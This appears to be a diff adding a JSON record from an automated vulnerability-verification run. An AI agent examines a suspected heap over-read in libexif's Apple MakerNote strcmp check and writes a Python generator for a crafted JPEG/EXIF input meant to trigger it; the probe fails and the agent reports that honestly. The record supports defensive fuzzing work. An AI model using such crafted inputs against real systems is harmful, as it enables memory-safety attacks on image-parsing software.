@@ -1,0 +1,181 @@
+{
+  "tag": "ex-delta-01__exif-003",
+  "gt": "exif_mnote_data_apple_identify",
+  "crash_type": "heap-buffer-overflow",
+  "tools_used": [
+    "read_function",
+    "check_reachability",
+    "reach_probe",
+    "submit_evidence"
+  ],
+  "evidence": {
+    "sanitizer_compatible": true,
+    "input_reaches_operand": true,
+    "guard_clamps": "none",
+    "pattern_present": true,
+    "reasoning": "Read exif_mnote_data_apple_identify: it unconditionally calls strcmp((const char*)e->data, \"Apple iOS\"). strcmp requires NUL-terminated strings; ExifEntry->data is a heap buffer of size e->size (from MakerNote tag payload) and is not guaranteed to include a terminating NUL. There is no length check (e->size) nor use of strncmp/memcmp. Therefore, if attacker supplies MakerNote data equal to \"Apple iOS\" prefix without a NUL within the allocated buffer, strcmp will read past the heap allocation until it finds a NUL, causing an ASan heap-buffer-overflow read. No guards/clamps are present in this function.\n\nI attempted a reach_probe with a minimal JPEG/EXIF/MakerNote construction, but the probe infrastructure failed due to missing ASan binary path, so I cannot provide runtime reach/crash confirmation here.",
+    "corrected_description": "Out-of-bounds heap read in strcmp due to treating ExifEntry->data (non-NUL-terminated binary MakerNote payload) as a C string; can read past e->data allocation when no NUL byte occurs within e->size.",
+    "control_flow_to_bug": "exif_loader_fuzzer -> libexif parses JPEG APP1 Exif -> builds ExifData/ExifEntry for ExifIFD tag 0x927C (MakerNote), allocating e->data of length e->size from input -> maker note handling selects Apple maker note path -> exif_mnote_data_apple_identify(ed,e) called -> strcmp((char*)e->data,\"Apple iOS\") reads beyond e->data if not NUL-terminated."
+  },
+  "dynamic": {
+    "any_reach": false,
+    "any_crash": false,
+    "probes": []
+  },
+  "score": 0.65,
+  "verdict": "LIKELY",
+  "basis": "unclamped tainted (no dynamic margin)",
+  "trajectory": [
+    {
+      "iter": 0,
+      "tool": "read_function",
+      "args": {
+        "name": "exif_mnote_data_apple_identify"
+      },
+      "result": "exif_mnote_data_apple_identify(const ExifData *ed, const ExifEntry *e) {\n    int variant;\n\n    if (!strcmp((const char *) e->data, \"Apple iOS\")) {\n        variant = 1;\n    } else {\n        variant = 0;\n    }\n\n    return variant;\n}"
+    },
+    {
+      "iter": 0,
+      "tool": "check_reachability",
+      "args": {
+        "function_name": "exif_mnote_data_apple_identify"
+      },
+      "result": "{\"reachable\": true, \"call_depth\": 4, \"reached_via\": \"direct\", \"n_callers\": 1}"
+    },
+    {
+      "iter": 1,
+      "tool": "reach_probe",
+      "args": {
+        "generator_code": "def generate()->bytes:\n    # Minimal JPEG with EXIF APP1 containing MakerNote with Apple iOS string but without NUL terminator.\n    # This is a best-effort; if parser differs, may not reach.\n    import struct\n    def be16(x): return struct.pack('>H', x)\n    def le16(x): return struct.pack('<H', x)\n    def le32(x): return struct.pack('<I', x)\n\n    # TIFF header (little endian)\n    tiff = b'II' + le16(42) + le32(8)  # IFD0 at offset 8\n\n    # IFD0 with 1 entry: ExifIFDPointer (tag 0x8769)\n    ifd0_entries = 1\n    # entry: tag, type=LONG(4), count=1, value=offset to ExifIFD\n    exif_ifd_offset = 8 + 2 + 12*ifd0_entries + 4  # right after IFD0\n    ifd0 = le16(ifd0_entries)\n    ifd0 += le16(0x8769) + le16(4) + le32(1) + le32(exif_ifd_offset)\n    ifd0 += le32(0)  # next IFD\n\n    # ExifIFD with 1 entry: MakerNote (tag 0x927C), type=UNDEFINED(7)\n    exif_entries = 1\n    maker = b'Apple iOS'  # 9 bytes, no NUL\n    maker_offset = exif_ifd_offset + 2 + 12*exif_entries + 4  # data after ExifIFD\n    exif_ifd = le16(exif_entries)\n    exif_ifd += le16(0x927C) + le16(7) + le32(len(maker)) + le32(maker_offset)\n    exif_ifd += le32(0)\n\n    tiff_full = tiff + ifd0 + exif_ifd + maker\n\n    exif = b'Exif\\x00\\x00' + tiff_full\n    app1 = b'\\xFF\\xE1' + be16(len(exif)+2) + exif\n\n    # JPEG SOI + APP1 + EOI\n    return b'\\xFF\\xD8' + app1 + b'\\xFF\\xD9'\n",
+        "target": "exif_mnote_data_apple_identify"
+      },
+      "result": "{\"error\": \"[Errno 2] No such file or directory: '/home/ze/fb-graphs/build/ex-delta-01/bugs/exif-003/bin/address'\"}"
+    },
+    {
+      "iter": 2,
+      "tool": "submit_evidence",
+      "args": {
+        "sanitizer_compatible": true,
+        "input_reaches_operand": true,
+        "guard_clamps": "none",
+        "pattern_present": true,
+        "reasoning": "Read exif_mnote_data_apple_identify: it unconditionally calls strcmp((const char*)e->data, \"Apple iOS\"). strcmp requires NUL-terminated strings; ExifEntry->data is a heap buffer of size e->size (from MakerNote tag payload) and is not guaranteed to include a terminating NUL. There is no length check (e->size) nor use of strncmp/memcmp. Therefore, if attacker supplies MakerNote data equal to \"Apple iOS\" prefix without a NUL within the allocated buffer, strcmp will read past the heap allocation until it finds a NUL, causing an ASan heap-buffer-overflow read. No guards/clamps are present in this function.\n\nI attempted a reach_probe with a minimal JPEG/EXIF/MakerNote construction, but the probe infrastructure failed due to missing ASan binary path, so I cannot provide runtime reach/crash confirmation here.",
+        "corrected_description": "Out-of-bounds heap read in strcmp due to treating ExifEntry->data (non-NUL-terminated binary MakerNote payload) as a C string; can read past e->data allocation when no NUL byte occurs within e->size.",
+        "control_flow_to_bug": "exif_loader_fuzzer -> libexif parses JPEG APP1 Exif -> builds ExifData/ExifEntry for ExifIFD tag 0x927C (MakerNote), allocating e->data of length e->size from input -> maker note handling selects Apple maker note path -> exif_mnote_data_apple_identify(ed,e) called -> strcmp((char*)e->data,\"Apple iOS\") reads beyond e->data if not NUL-terminated."
+      },
+      "result": "{\"received\": true}"
+    }
+  ],
+  "token_log": [
+    {
+      "iter": 0,
+      "model": "gpt-5.2",
+      "input_tokens": 1049,
+      "output_tokens": 66,
+      "total_tokens": 1115,
+      "latency_ms": 1181
+    },
+    {
+      "iter": 1,
+      "model": "gpt-5.2",
+      "input_tokens": 1238,
+      "output_tokens": 578,
+      "total_tokens": 1816,
+      "latency_ms": 6778
+    },
+    {
+      "iter": 2,
+      "model": "gpt-5.2",
+      "input_tokens": 1866,
+      "output_tokens": 391,
+      "total_tokens": 2257,
+      "latency_ms": 6144
+    }
+  ],
+  "token_totals": {
+    "input": 4153,
+    "output": 1035,
+    "total": 5188,
+    "llm_calls": 3
+  },
+  "full_messages": [
+    {
+      "role": "system",
+      "content": "You are a vulnerability verifier. All candidate functions are already\nreachable from the fuzzer — do NOT re-litigate reachability as pass/fail. Your job\nis to gather EVIDENCE about whether the reached code actually contains a\ncrashing memory-safety bug of the stated type, then submit it.\n\nGather evidence with the tools:\n- read_function(name): read the real source.\n- check_reachability(function_name): confirm the call graph (depth, direct/indirect).\n- reach_probe(generator_code, target): write Python `def generate()->bytes` that\n  produces an input aiming to REACH `target` (a function name or \"file.c:LINE\").\n  It runs the input on the real ASan binary under gdb and tells you whether the\n  target was reached and whether it crashed. A crash is proof; a reach grounds\n  your judgment. Only a real crash or reach can raise the score above the ceiling —\n  you cannot assert a high score from reading alone.\n- submit_evidence(...): report your structured findings (see its schema). Call it\n  once, last.\n\nTwo of the fields are NOT about scoring — they correct the SP for the downstream\nPoV stage, and you are the right one to write them because you just read the real\ncode (and maybe ran a reach_probe):\n- corrected_description: if the SP's stated bug type/description is wrong or\n  imprecise given the real code, write the accurate one (else restate it).\n- control_flow_to_bug: the real path from the fuzzer entry to the crash site — the\n  key functions, branches, and conditions that must hold to trigger it.\n\nDo NOT pass things \"when in doubt\". Report what the evidence shows. Absence of a\ncrash is not proof of safety; a proven clamp/guard on the tainted value IS\ndisconfirming."
+    },
+    {
+      "role": "user",
+      "content": "Verify this suspicious point.\n\nFuzzer: exif_loader_fuzzer   Sanitizer: address\nFunction: exif_mnote_data_apple_identify\nClaimed bug type: heap-buffer-overflow\nSuspicious-point description (from the finder — may be imprecise): `strcmp((const char *) e->data, \"Apple iOS\")` runs strcmp over the entry's heap data buffer, which is not guaranteed NUL-terminated; strcmp reads past the end of the heap allocation.\n\nControl flow to the bug:\n  - exif_loader_fuzzer parses a MakerNote entry into e->data (attacker length, no forced NUL)\n  - exif_mnote_data_apple_identify calls strcmp((char*)e->data, \"Apple iOS\")\n  - strcmp reads past the end of the heap buffer -> heap-buffer-overflow\n\nThe function is reachable (confirm with check_reachability if useful).\n\nRead the function, judge whether a fuzzer input can drive a heap-buffer-overflow\nthere, optionally reach_probe a candidate input to ground it, then submit_evidence."
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_ZAdn41OGketX4q0M5D5yEX38",
+          "type": "function",
+          "function": {
+            "name": "read_function",
+            "arguments": "{\"name\": \"exif_mnote_data_apple_identify\"}"
+          }
+        },
+        {
+          "id": "call_RONYMpEjSrScVPoEfsWZ0pOY",
+          "type": "function",
+          "function": {
+            "name": "check_reachability",
+            "arguments": "{\"function_name\": \"exif_mnote_data_apple_identify\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_ZAdn41OGketX4q0M5D5yEX38",
+      "content": "exif_mnote_data_apple_identify(const ExifData *ed, const ExifEntry *e) {\n    int variant;\n\n    if (!strcmp((const char *) e->data, \"Apple iOS\")) {\n        variant = 1;\n    } else {\n        variant = 0;\n    }\n\n    return variant;\n}"
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_RONYMpEjSrScVPoEfsWZ0pOY",
+      "content": "{\"reachable\": true, \"call_depth\": 4, \"reached_via\": \"direct\", \"n_callers\": 1}"
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_I0gBwV8o249OiiMf6leqodNz",
+          "type": "function",
+          "function": {
+            "name": "reach_probe",
+            "arguments": "{\"generator_code\":\"def generate()->bytes:\\n    # Minimal JPEG with EXIF APP1 containing MakerNote with Apple iOS string but without NUL terminator.\\n    # This is a best-effort; if parser differs, may not reach.\\n    import struct\\n    def be16(x): return struct.pack('>H', x)\\n    def le16(x): return struct.pack('<H', x)\\n    def le32(x): return struct.pack('<I', x)\\n\\n    # TIFF header (little endian)\\n    tiff = b'II' + le16(42) + le32(8)  # IFD0 at offset 8\\n\\n    # IFD0 with 1 entry: ExifIFDPointer (tag 0x8769)\\n    ifd0_entries = 1\\n    # entry: tag, type=LONG(4), count=1, value=offset to ExifIFD\\n    exif_ifd_offset = 8 + 2 + 12*ifd0_entries + 4  # right after IFD0\\n    ifd0 = le16(ifd0_entries)\\n    ifd0 += le16(0x8769) + le16(4) + le32(1) + le32(exif_ifd_offset)\\n    ifd0 += le32(0)  # next IFD\\n\\n    # ExifIFD with 1 entry: MakerNote (tag 0x927C), type=UNDEFINED(7)\\n    exif_entries = 1\\n    maker = b'Apple iOS'  # 9 bytes, no NUL\\n    maker_offset = exif_ifd_offset + 2 + 12*exif_entries + 4  # data after ExifIFD\\n    exif_ifd = le16(exif_entries)\\n    exif_ifd += le16(0x927C) + le16(7) + le32(len(maker)) + le32(maker_offset)\\n    exif_ifd += le32(0)\\n\\n    tiff_full = tiff + ifd0 + exif_ifd + maker\\n\\n    exif = b'Exif\\\\x00\\\\x00' + tiff_full\\n    app1 = b'\\\\xFF\\\\xE1' + be16(len(exif)+2) + exif\\n\\n    # JPEG SOI + APP1 + EOI\\n    return b'\\\\xFF\\\\xD8' + app1 + b'\\\\xFF\\\\xD9'\\n\",\"target\":\"exif_mnote_data_apple_identify\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_I0gBwV8o249OiiMf6leqodNz",
+      "content": "{\"error\": \"[Errno 2] No such file or directory: '/home/ze/fb-graphs/build/ex-delta-01/bugs/exif-003/bin/address'\"}"
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_ylT6dRF8Abawm3JHxL3GwdUn",
+          "type": "function",
+          "function": {
+            "name": "submit_evidence",
+            "arguments": "{\"sanitizer_compatible\":true,\"input_reaches_operand\":true,\"guard_clamps\":\"none\",\"pattern_present\":true,\"reasoning\":\"Read exif_mnote_data_apple_identify: it unconditionally calls strcmp((const char*)e->data, \\\"Apple iOS\\\"). strcmp requires NUL-terminated strings; ExifEntry->data is a heap buffer of size e->size (from MakerNote tag payload) and is not guaranteed to include a terminating NUL. There is no length check (e->size) nor use of strncmp/memcmp. Therefore, if attacker supplies MakerNote data equal to \\\"Apple iOS\\\" prefix without a NUL within the allocated buffer, strcmp will read past the heap allocation until it finds a NUL, causing an ASan heap-buffer-overflow read. No guards/clamps are present in this function.\\n\\nI attempted a reach_probe with a minimal JPEG/EXIF/MakerNote construction, but the probe infrastructure failed due to missing ASan binary path, so I cannot provide runtime reach/crash confirmation here.\",\"corrected_description\":\"Out-of-bounds heap read in strcmp due to treating ExifEntry->data (non-NUL-terminated binary MakerNote payload) as a C string; can read past e->data allocation when no NUL byte occurs within e->size.\",\"control_flow_to_bug\":\"exif_loader_fuzzer -> libexif parses JPEG APP1 Exif -> builds ExifData/ExifEntry for ExifIFD tag 0x927C (MakerNote), allocating e->data of length e->size from input -> maker note handling selects Apple maker note path -> exif_mnote_data_apple_identify(ed,e) called -> strcmp((char*)e->data,\\\"Apple iOS\\\") reads beyond e->data if not NUL-terminated.\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_ylT6dRF8Abawm3JHxL3GwdUn",
+      "content": "{\"received\": true}"
+    }
+  ]
+}
